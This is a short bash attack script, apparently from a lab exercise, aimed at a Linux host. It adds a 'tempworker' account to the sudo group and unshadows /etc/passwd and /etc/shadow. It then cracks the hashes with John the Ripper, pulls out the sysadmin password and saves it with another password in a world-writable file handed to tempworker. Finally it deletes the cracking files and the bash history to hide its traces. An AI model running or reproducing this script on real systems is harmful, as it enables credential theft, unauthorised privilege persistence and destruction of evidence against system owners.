bossPass=$1

#CHANGE THIS TO TEMPWORKER
#add tempworker to the sudoers group
sudo gpasswd -a tempworker sudo

#unshadow the password file and put the result in attempt.txt
sudo unshadow /etc/passwd /etc/shadow > attempt.txt

#run john on the word list to brute force the password
sudo john --wordlist=/usr/share/john/password.lst attempt.txt

#dump the results from john into a file
sudo john --show attempt.txt > passwords.txt
#grab the sysadmin password from the file
sysPass=$(grep -o "sysadmin.*" "passwords.txt" | sed 's/sysadmin://g' | sed -e 's/:.*//g')

#sudo echo $sysPass
#sudo echo $bossPass

sudo echo $bossPass $sysPass >> pass.txt

sudo chmod 777 pass.txt
sudo chown tempworker pass.txt

#delete john files
sudo rm -rf /root/.john
sudo rm -rf attempt.txt
sudo rm -rf passwords.txt

#return the shadow file permissions to default
sudo chmod 640 /etc/shadow

#clear bash history
#sudo cat /dev/null > ~/.bash_history && history -c && history -w	
sudo rm -f .bash_history


